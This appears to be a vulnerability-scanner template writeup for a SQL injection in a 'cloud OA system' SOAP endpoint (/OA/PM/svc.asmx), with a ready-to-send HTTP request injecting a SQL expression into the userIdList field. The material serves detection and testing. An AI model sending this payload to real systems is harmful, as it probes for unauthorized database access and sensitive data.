# Nuclei Template: Cloud OA System - SQL Injection
**Template ID:** cloud-oa-system-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`cloud-oa-system-sqli.yaml`)

## Vulnerability Information & PoC

## Description
cloud OA system /OA/PM/svc.asmx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database.

## Steps to reproduce / Exploit Payload
```http
POST /OA/PM/svc.asmx HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUsersInfo xmlns="http://tempuri.org/">
      <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{num}}'),2))</userIdList>
    </GetUsersInfo>
  </soap:Body>
</soap:Envelope>
```

## References
- https://github.com/GREENHAT7/pxplan/blob/e2fc04893ca95e177021ddf61cc2134ecc120a8e/xray_pocs/yaml-poc-eqccd-eqccd_oa-sql_injection-CT-456760.yml#L8
